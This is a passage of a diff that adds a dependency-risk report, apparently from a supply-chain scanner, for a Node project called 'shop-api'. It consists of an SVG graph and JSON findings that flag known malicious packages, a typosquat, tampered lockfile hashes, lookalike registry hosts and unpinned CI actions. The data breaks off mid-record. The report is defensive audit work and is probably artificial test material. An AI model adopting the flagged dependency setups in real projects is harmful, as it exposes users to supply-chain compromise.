+<polygon fill="#9aa1a9" stroke="#9aa1a9" points="417.06,-220.6 423.41,-220.82 418.58,-216.69 417.06,-220.6"/>
+</g>
+<!-- pkg:npm/mocha@8.4.0&#45;&gt;pkg:npm/js&#45;yaml@4.0.0 -->
+<g id="edge8" class="edge">
+<title>pkg:npm/mocha@8.4.0&#45;&gt;pkg:npm/js&#45;yaml@4.0.0</title>
+<path fill="none" stroke="#d9480f" d="M299.75,-167.16C330.37,-169.16 372.54,-171.92 405.66,-174.08"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="405.61,-176.18 411.73,-174.48 405.88,-171.99 405.61,-176.18"/>
+</g>
+<!-- pkg:npm/mocha@8.4.0&#45;&gt;pkg:npm/minimatch@3.0.4 -->
+<g id="edge9" class="edge">
+<title>pkg:npm/mocha@8.4.0&#45;&gt;pkg:npm/minimatch@3.0.4</title>
+<path fill="none" stroke="#d9480f" d="M299.93,-153.56C353.89,-141.02 451.24,-124.91 530.5,-147.5 553.64,-154.09 576.65,-168.24 594.05,-180.91"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="593.19,-182.9 599.26,-184.79 595.7,-179.52 593.19,-182.9"/>
+</g>
+<!-- pkg:npm/nanoid@3.1.20 -->
+<g id="node16" class="node">
+<title>pkg:npm/nanoid@3.1.20</title>
+<g id="a_node16"><a xlink:title="[high] Known vulnerability in nanoid@3.1.20: nanoid: Integer Overflow or Wraparound&#10;[high] Known vulnerability in nanoid@3.1.20: nanoid: custom generators can loop indefinitely when size is zero&#10;[high] Known vulnerability in nanoid@3.1.20: nanoid: non&#45;secure generators can loop indefinitely with negative size">
+<path fill="#ffe8d9" stroke="#d9480f" stroke-width="2" stroke-dasharray="5,2" d="M494,-100C494,-100 424,-100 424,-100 418,-100 412,-94 412,-88 412,-88 412,-71 412,-71 412,-65 418,-59 424,-59 424,-59 494,-59 494,-59 500,-59 506,-65 506,-71 506,-71 506,-88 506,-88 506,-94 500,-100 494,-100"/>
+<text text-anchor="middle" x="459" y="-88" font-family="Helvetica,sans-Serif" font-size="10.00">nanoid@3.1.20</text>
+<text text-anchor="middle" x="459" y="-77" font-family="Helvetica,sans-Serif" font-size="10.00">3 findings · high</text>
+<text text-anchor="middle" x="459" y="-66" font-family="Helvetica,sans-Serif" font-size="10.00">(dev)</text>
+</a>
+</g>
+</g>
+<!-- pkg:npm/mocha@8.4.0&#45;&gt;pkg:npm/nanoid@3.1.20 -->
+<g id="edge10" class="edge">
+<title>pkg:npm/mocha@8.4.0&#45;&gt;pkg:npm/nanoid@3.1.20</title>
+<path fill="none" stroke="#d9480f" d="M299.57,-153.37C313.97,-148.98 330.15,-143.54 344.5,-137.5 364.47,-129.09 368.24,-124.43 387.5,-114.5 394.86,-110.71 402.68,-106.75 410.33,-102.92"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="411.71,-104.58 416.14,-100.02 409.84,-100.82 411.71,-104.58"/>
+</g>
+<!-- pkg:npm/serialize&#45;javascript@5.0.1 -->
+<g id="node20" class="node">
+<title>pkg:npm/serialize&#45;javascript@5.0.1</title>
+<g id="a_node20"><a xlink:title="[high] Known vulnerability in serialize&#45;javascript@5.0.1: Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()">
+<path fill="#ffe8d9" stroke="#d9480f" stroke-width="2" stroke-dasharray="5,2" d="M518.5,-41C518.5,-41 399.5,-41 399.5,-41 393.5,-41 387.5,-35 387.5,-29 387.5,-29 387.5,-12 387.5,-12 387.5,-6 393.5,0 399.5,0 399.5,0 518.5,0 518.5,0 524.5,0 530.5,-6 530.5,-12 530.5,-12 530.5,-29 530.5,-29 530.5,-35 524.5,-41 518.5,-41"/>
+<text text-anchor="middle" x="459" y="-29" font-family="Helvetica,sans-Serif" font-size="10.00">serialize&#45;javascript@5.0.1</text>
+<text text-anchor="middle" x="459" y="-18" font-family="Helvetica,sans-Serif" font-size="10.00">1 finding · high</text>
+<text text-anchor="middle" x="459" y="-7" font-family="Helvetica,sans-Serif" font-size="10.00">(dev)</text>
+</a>
+</g>
+</g>
+<!-- pkg:npm/mocha@8.4.0&#45;&gt;pkg:npm/serialize&#45;javascript@5.0.1 -->
+<g id="edge11" class="edge">
+<title>pkg:npm/mocha@8.4.0&#45;&gt;pkg:npm/serialize&#45;javascript@5.0.1</title>
+<path fill="none" stroke="#d9480f" d="M299.79,-158.65C315.19,-154.75 332,-148.27 344.5,-137.5 377.48,-109.09 355.75,-79.28 387.5,-49.5 389.35,-47.77 391.31,-46.13 393.36,-44.59"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="394.58,-46.31 398.31,-41.16 392.18,-42.86 394.58,-46.31"/>
+</g>
+<!-- pkg:npm/ua&#45;parser&#45;js@0.7.29 -->
+<g id="node21" class="node">
+<title>pkg:npm/ua&#45;parser&#45;js@0.7.29</title>
+<g id="a_node21"><a xlink:title="[critical] Known malicious package in ua&#45;parser&#45;js@0.7.29: Embedded malware in ua&#45;parser&#45;js&#10;[high] ua&#45;parser&#45;js@0.7.29 is not published on the registry (unpublished or fabricated version)">
+<path fill="#f9dedc" stroke="#b3261e" stroke-width="2" d="M116.5,-425.5C116.5,-425.5 25.5,-425.5 25.5,-425.5 19.5,-425.5 13.5,-419.5 13.5,-413.5 13.5,-413.5 13.5,-401.5 13.5,-401.5 13.5,-395.5 19.5,-389.5 25.5,-389.5 25.5,-389.5 116.5,-389.5 116.5,-389.5 122.5,-389.5 128.5,-395.5 128.5,-401.5 128.5,-401.5 128.5,-413.5 128.5,-413.5 128.5,-419.5 122.5,-425.5 116.5,-425.5"/>
+<text text-anchor="middle" x="71" y="-410.5" font-family="Helvetica,sans-Serif" font-size="10.00">ua&#45;parser&#45;js@0.7.29</text>
+<text text-anchor="middle" x="71" y="-399.5" font-family="Helvetica,sans-Serif" font-size="10.00">2 findings · critical</text>
+</a>
+</g>
+</g>
+<!-- lg_critical -->
+<g id="node22" class="node">
+<title>lg_critical</title>
+<path fill="#f9dedc" stroke="#b3261e" stroke-width="2" d="M86,-641.5C86,-641.5 56,-641.5 56,-641.5 50,-641.5 44,-635.5 44,-629.5 44,-629.5 44,-617.5 44,-617.5 44,-611.5 50,-605.5 56,-605.5 56,-605.5 86,-605.5 86,-605.5 92,-605.5 98,-611.5 98,-617.5 98,-617.5 98,-629.5 98,-629.5 98,-635.5 92,-641.5 86,-641.5"/>
+<text text-anchor="middle" x="71" y="-621.3" font-family="Helvetica,sans-Serif" font-size="9.00">critical</text>
+</g>
+<!-- lg_high -->
+<g id="node23" class="node">
+<title>lg_high</title>
+<path fill="#ffe8d9" stroke="#d9480f" stroke-width="2" d="M86,-587.5C86,-587.5 56,-587.5 56,-587.5 50,-587.5 44,-581.5 44,-575.5 44,-575.5 44,-563.5 44,-563.5 44,-557.5 50,-551.5 56,-551.5 56,-551.5 86,-551.5 86,-551.5 92,-551.5 98,-557.5 98,-563.5 98,-563.5 98,-575.5 98,-575.5 98,-581.5 92,-587.5 86,-587.5"/>
+<text text-anchor="middle" x="71" y="-567.3" font-family="Helvetica,sans-Serif" font-size="9.00">high</text>
+</g>
+<!-- lg_medium -->
+<g id="node24" class="node">
+<title>lg_medium</title>
+<path fill="#fff4cc" stroke="#e0a800" stroke-width="2" d="M86,-533.5C86,-533.5 56,-533.5 56,-533.5 50,-533.5 44,-527.5 44,-521.5 44,-521.5 44,-509.5 44,-509.5 44,-503.5 50,-497.5 56,-497.5 56,-497.5 86,-497.5 86,-497.5 92,-497.5 98,-503.5 98,-509.5 98,-509.5 98,-521.5 98,-521.5 98,-527.5 92,-533.5 86,-533.5"/>
+<text text-anchor="middle" x="71" y="-513.3" font-family="Helvetica,sans-Serif" font-size="9.00">medium</text>
+</g>
+<!-- lg_dev -->
+<g id="node25" class="node">
+<title>lg_dev</title>
+<path fill="none" stroke="#9aa1a9" stroke-dasharray="5,2" d="M114,-479.5C114,-479.5 28,-479.5 28,-479.5 22,-479.5 16,-473.5 16,-467.5 16,-467.5 16,-455.5 16,-455.5 16,-449.5 22,-443.5 28,-443.5 28,-443.5 114,-443.5 114,-443.5 120,-443.5 126,-449.5 126,-455.5 126,-455.5 126,-467.5 126,-467.5 126,-473.5 120,-479.5 114,-479.5"/>
+<text text-anchor="middle" x="71" y="-459.3" font-family="Helvetica,sans-Serif" font-size="9.00">dev / build / ci scope</text>
+</g>
+</g>
+</svg>
+</div><h2>Dependency graph explorer</h2>
+<div class="filters"><label><input type="checkbox" id="gRisky" checked> only branches that lead to findings</label>
+<input id="gQ" placeholder="find package, e.g. lodash" size="28"><button id="gGo">find</button>
+<button id="gExpand">expand risky</button><button id="gCollapse">collapse all</button><span id="gMsg" class="meta"></span></div>
+<div id="gTree" class="tree"></div>
+<script id="gData" type="application/json">{"nodes":[{"l":"shop-api@1.4.0","s":null,"n":0,"sc":"prod","d":1,"b":"critical"},{"l":"fastbuilds/node-runtime@18","s":"high","n":2,"sc":"prod","e":"docker","d":1,"t":["[high] Image 'fastbuilds/node-runtime' comes from a non-allowlisted publisher (docker.io)","[low] Image 'fastbuilds/node-runtime:18' is not pinned by digest"],"b":"high"},{"l":"node@latest","s":"medium","n":1,"sc":"build","e":"docker","d":1,"t":["[medium] Image 'node' uses a mutable tag (latest)"],"b":"medium"},{"l":"actions/checkout@v4","s":"low","n":1,"sc":"ci","e":"github-actions","d":1,"t":["[low] GitHub Action actions/checkout: first-party action pinned to mutable tag 'v4'"],"b":"low"},{"l":"actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8","s":null,"n":0,"sc":"ci","e":"github-actions","d":1,"t":[],"b":null},{"l":"quick-actions/npm-cache@main","s":"high","n":1,"sc":"ci","e":"github-actions","d":1,"t":["[high] GitHub Action quick-actions/npm-cache: branch/unversioned ref 'main' (code changes on every run)"],"b":"high"},{"l":"@ungap/promise-all-settled@1.1.2","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"accepts@1.3.8","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"ansi-colors@4.1.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"ansi-regex@3.0.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"ansi-regex@5.0.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"ansi-styles@4.3.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"anymatch@3.1.3","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"argparse@2.0.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"array-flatten@1.1.1","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"balanced-match@1.0.2","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"binary-extensions@2.3.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"body-parser@1.19.0","s":"high","n":3,"sc":"prod","e":"npm","d":0,"t":["[high] Known vulnerability in body-parser@1.19.0: body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body","[high] Known vulnerability in body-parser@1.19.0: body-parser vulnerable to denial of service when url encoding is enabled","[low] Known vulnerability in body-parser@1.19.0: body-parser vulnerable to denial of service when invalid limit value silently disables size enforcement"],"b":"high"},{"l":"brace-expansion@1.1.22","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"braces@3.0.3","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"browser-stdout@1.3.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"bytes@3.1.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"camelcase@6.3.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"chalk@4.1.2","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"chokidar@3.5.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":"info"},{"l":"cliui@7.0.4","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"color-convert@2.0.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"color-name@1.1.4","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"concat-map@0.0.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"content-disposition@0.5.3","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"content-type@1.0.5","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"cookie-signature@1.0.6","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"cookie@0.4.0","s":"low","n":1,"sc":"prod","e":"npm","d":0,"t":["[low] Known vulnerability in cookie@0.4.0: cookie accepts cookie name, path, and domain with out of bounds characters"],"b":"low"},{"l":"cross-env@7.0.3","s":null,"n":0,"sc":"prod","e":"npm","d":1,"t":[],"b":null},{"l":"cross-spawn@7.0.6","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"crossenv@6.1.1","s":"critical","n":4,"sc":"dev","e":"npm","d":1,"t":["[critical] Suspicious install script in crossenv@6.1.1","[critical] crossenv was taken down by npm security (malicious package)","[high] Possible typosquat: 'crossenv' looks like 'cross-env'","[medium] New direct dependency: crossenv@6.1.1"],"b":"critical"},{"l":"debug-helper-utils@1.0.2","s":"high","n":5,"sc":"prod","e":"npm","d":1,"t":["[high] Lockfile root declares 'debug-helper-utils' which is not in package.json","[medium] debug-helper-utils@1.0.2 has no integrity hash in the lockfile","[medium] debug-helper-utils@1.0.2 resolved from outside the npm registry (npm.corp-artifacts.net)","[medium] New direct dependency: debug-helper-utils@1.0.2","[low] debug-helper-utils@1.0.2 runs an install-time script (contents not inspected)"],"b":"high"},{"l":"debug@2.6.9","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"debug@4.3.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"decamelize@4.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"depd@1.1.2","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"destroy@1.0.4","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"diff@5.0.0","s":"low","n":1,"sc":"dev","e":"npm","d":0,"t":["[low] Known vulnerability in diff@5.0.0: jsdiff has a Denial of Service vulnerability in parsePatch and applyPatch"],"b":"low"},{"l":"duplexer@0.1.2","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"ee-first@1.1.1","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"emoji-regex@8.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"encodeurl@1.0.4","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"escalade@3.2.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"escape-html@1.0.3","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"escape-string-regexp@4.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"etag@1.8.1","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"event-stream@3.3.6","s":"critical","n":3,"sc":"prod","e":"npm","d":1,"t":["[critical] Known vulnerability in event-stream@3.3.6: Critical severity vulnerability that affects event-stream and flatmap-stream","[high] event-stream@3.3.6 is not published on the registry (unpublished or fabricated version)","[info] event-stream changed: 3.3.4 -> 3.3.6"],"b":"critical"},{"l":"express@4.17.1","s":"medium","n":2,"sc":"prod","e":"npm","d":1,"t":["[medium] Known vulnerability in express@4.17.1: Express.js Open Redirect in malformed URLs","[low] Known vulnerability in express@4.17.1: express vulnerable to XSS via response.redirect()"],"b":"high"},{"l":"fill-range@7.1.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"finalhandler@1.1.2","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"find-up@5.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"flat@5.0.2","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"flatmap-stream@0.1.1","s":"critical","n":4,"sc":"prod","e":"npm","d":0,"t":["[critical] Known malicious package in flatmap-stream@0.1.1: Malicious Package in flatmap-stream","[critical] flatmap-stream was taken down by npm security (malicious package)","[critical] Known vulnerability in flatmap-stream@0.1.1: Critical severity vulnerability that affects event-stream and flatmap-stream","[info] New transitive dependency: flatmap-stream@0.1.1"],"b":"critical"},{"l":"forwarded@0.2.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"fresh@0.5.2","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"from@0.1.7","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"fs.realpath@1.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"fsevents@2.3.3","s":"info","n":1,"sc":"dev","e":"npm","d":0,"t":["[info] fsevents@2.3.3 runs a standard native-build install script"],"b":"info"},{"l":"get-caller-file@2.0.5","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"glob-parent@5.1.2","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"glob@7.1.6","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":"high"},{"l":"growl@1.10.5","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"has-flag@4.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"he@1.2.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"http-errors@1.7.2","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"iconv-lite@0.4.24","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"inflight@1.0.6","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"inherits@2.0.3","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"ipaddr.js@1.9.1","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"is-binary-path@2.1.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"is-extglob@2.1.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"is-fullwidth-code-point@2.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"is-fullwidth-code-point@3.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"is-glob@4.0.3","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"is-number@7.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"is-plain-obj@2.1.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"isexe@2.0.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"js-yaml@4.0.0","s":"high","n":5,"sc":"dev","e":"npm","d":0,"t":["[high] Known vulnerability in js-yaml@4.0.0: JS-YAML: Quadratic CPU consumption in !!omap resolution (3.x and 4.x) \u2014 CVE-2026-59870 fix not backported","[high] Known vulnerability in js-yaml@4.0.0: js-yaml: YAML merge-key chains can force quadratic CPU consumption","[high] Known vulnerability in js-yaml@4.0.0: js-yaml: maxTotalMergeKeys does not limit CPU use for empty merge sources","[medium] Known vulnerability in js-yaml@4.0.0: JS-YAML: Quadratic-complexity DoS in merge key handling via repeated aliases","[medium] Known vulnerability in js-yaml@4.0.0: js-yaml has prototype pollution in merge (<<)"],"b":"high"},{"l":"locate-path@6.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"lodash@4.17.15","s":"critical","n":7,"sc":"prod","e":"npm","d":1,"t":["[critical] Integrity hash changed for unchanged version lodash@4.17.15","[critical] Lockfile hash for lodash@4.17.15 does not match the registry","[high] Known vulnerability in lodash@4.17.15: Command Injection in lodash","[high] Known vulnerability in lodash@4.17.15: Prototype Pollution in lodash","[high] Known vulnerability in lodash@4.17.15: lodash vulnerable to Code Injection via `_.template` imports key names","[medium] Known vulnerability in lodash@4.17.15: Lodash has Prototype Pollution Vulnerability in `_.unset`, `_.omit`, and `_.pullAt` functions"],"b":"critical"},{"l":"log-symbols@4.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"map-stream@0.1.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"media-typer@0.3.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"merge-descriptors@1.0.1","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"methods@1.1.2","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"mime-db@1.52.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"mime-types@2.1.35","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"mime@1.6.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"minimatch@3.0.4","s":"high","n":4,"sc":"dev","e":"npm","d":0,"t":["[high] Known vulnerability in minimatch@3.0.4: minimatch ReDoS vulnerability","[high] Known vulnerability in minimatch@3.0.4: minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions","[high] Known vulnerability in minimatch@3.0.4: minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments","[high] Known vulnerability in minimatch@3.0.4: minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern"],"b":"high"},{"l":"minimist@1.2.5","s":"critical","n":3,"sc":"prod","e":"npm","d":1,"t":["[critical] Known vulnerability in minimist@1.2.5: Prototype Pollution in minimist","[high] Download source for minimist@1.2.5 changed: registry.npmjs.org -> registry.npmjs-cdn.com","[high] minimist@1.2.5 is fetched over plain HTTP"],"b":"critical"},{"l":"mocha@8.4.0","s":null,"n":0,"sc":"dev","e":"npm","d":1,"t":[],"b":"high"},{"l":"ms@2.0.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"ms@2.1.1","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"ms@2.1.2","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"ms@2.1.3","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"nanoid@3.1.20","s":"high","n":5,"sc":"dev","e":"npm","d":0,"t":["[high] Known vulnerability in nanoid@3.1.20: nanoid: Integer Overflow or Wraparound","[high] Known vulnerability in nanoid@3.1.20: nanoid: custom generators can loop indefinitely when size is zero","[high] Known vulnerability in nanoid@3.1.20: nanoid: non-secure generators can loop indefinitely with negative size","[medium] Known vulnerability in nanoid@3.1.20: Exposure of Sensitive Information to an Unauthorized Actor in nanoid","[medium] Known vulnerability in nanoid@3.1.20: Predictable results in nanoid generation when given non-integer values"],"b":"high"},{"l":"negotiator@0.6.3","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"node-fetch@2.6.0","s":"high","n":2,"sc":"prod","e":"npm","d":1,"t":["[high] Known vulnerability in node-fetch@2.6.0: node-fetch forwards secure headers to untrusted sites","[low] Known vulnerability in node-fetch@2.6.0: The `size` option isn't honored after following a redirect in node-fetch"],"b":"high"},{"l":"normalize-path@3.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"on-finished@2.3.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"once@1.4.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"p-limit@3.1.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"p-locate@5.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"parseurl@1.3.3","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"path-exists@4.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"path-is-absolute@1.0.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"path-key@3.1.1","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"path-to-regexp@0.1.7","s":"high","n":3,"sc":"prod","e":"npm","d":0,"t":["[high] Known vulnerability in path-to-regexp@0.1.7: path-to-regexp contains a ReDoS","[high] Known vulnerability in path-to-regexp@0.1.7: path-to-regexp outputs backtracking regular expressions","[high] Known vulnerability in path-to-regexp@0.1.7: path-to-regexp vulnerable to Regular Expression Denial of Service via multiple route parameters"],"b":"high"},{"l":"pause-stream@0.0.11","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"picomatch@2.3.2","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"proxy-addr@2.0.8","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"qs@6.7.0","s":"high","n":5,"sc":"prod","e":"npm","d":0,"t":["[high] Known vulnerability in qs@6.7.0: qs vulnerable to Prototype Pollution","[medium] Known vulnerability in qs@6.7.0: qs : qs.stringify with arrayFormat 'comma' throws an uncaught TypeError on array elements carrying a non-callable own to","[medium] Known vulnerability in qs@6.7.0: qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion","[medium] Known vulnerability in qs@6.7.0: qs: Denial of Service via Attacker Controlled isBuffer","[low] Known vulnerability in qs@6.7.0: qs's arrayLimit bypass in comma parsing allows denial of service"],"b":"high"},{"l":"randombytes@2.1.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"range-parser@1.2.1","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"raw-body@2.4.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"readdirp@3.5.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"require-directory@2.1.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"safe-buffer@5.1.2","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"safer-buffer@2.1.2","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"send@0.17.1","s":"low","n":1,"sc":"prod","e":"npm","d":0,"t":["[low] Known vulnerability in send@0.17.1: send vulnerable to template injection that can lead to XSS"],"b":"low"},{"l":"serialize-javascript@5.0.1","s":"high","n":3,"sc":"dev","e":"npm","d":0,"t":["[high] Known vulnerability in serialize-javascript@5.0.1: Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()","[medium] Known vulnerability in serialize-javascript@5.0.1: Serialize JavaScript has CPU Exhaustion Denial of Service via crafted array-like objects","[low] Known vulnerability in serialize-javascript@5.0.1: Serialize JavaScript: Cross-site scripting (XSS) via unescaped <\/script at the end of a serialized function body"],"b":"high"},{"l":"serve-static@1.14.1","s":"low","n":1,"sc":"prod","e":"npm","d":0,"t":["[low] Known vulnerability in serve-static@1.14.1: serve-static vulnerable to template injection that can lead to XSS"],"b":"low"},{"l":"setprototypeof@1.1.1","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"shebang-command@2.0.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"shebang-regex@3.0.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"split@0.3.3","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"statuses@1.5.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"stream-combiner@0.0.4","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"string-width@2.1.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"string-width@4.2.3","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"strip-ansi@4.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"strip-ansi@6.0.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"strip-json-comments@3.1.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"supports-color@7.2.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"supports-color@8.1.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"through@2.3.8","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"to-regex-range@5.0.1","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"toidentifier@1.0.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l"